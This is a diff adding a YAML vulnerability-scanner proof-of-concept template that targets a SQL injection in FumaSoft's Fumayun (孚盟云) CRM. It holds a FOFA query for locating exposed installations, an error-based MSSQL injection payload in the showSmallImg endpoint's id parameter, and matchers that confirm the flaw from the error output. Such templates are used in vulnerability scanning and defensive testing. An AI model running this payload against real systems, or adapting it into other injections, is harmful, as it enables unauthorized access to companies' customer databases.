@@ -1,0 +1,17 @@
+id: poc-yaml-fumasoft-showsmallimg-sqli
+info:
+  name: 孚盟云 showSmallImg SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 孚盟云
+  fofa: app="孚盟软件-孚盟云"
+variables:
+  t1: random_int(1000,100000)
+  t2: md5(t1)
+requests:
+- method: GET
+  path: /Ajax/upload.ashx?action=showSmallImg&id=1%20and%201<sys.fn_varbintohexstr(hashbytes('MD5','{{.t1}}'))--&tabname=bfContacts&imgField=FID
+  expression: status_code == 500 && contains(body,"0x" + t2) && contains(body,"FumaCRM")
+    && contains(body,"showSmallImg") && matches(body,"转换成数据类型(.*?)时失败") && matches(body,"在将(.*?)值")
+transport: http
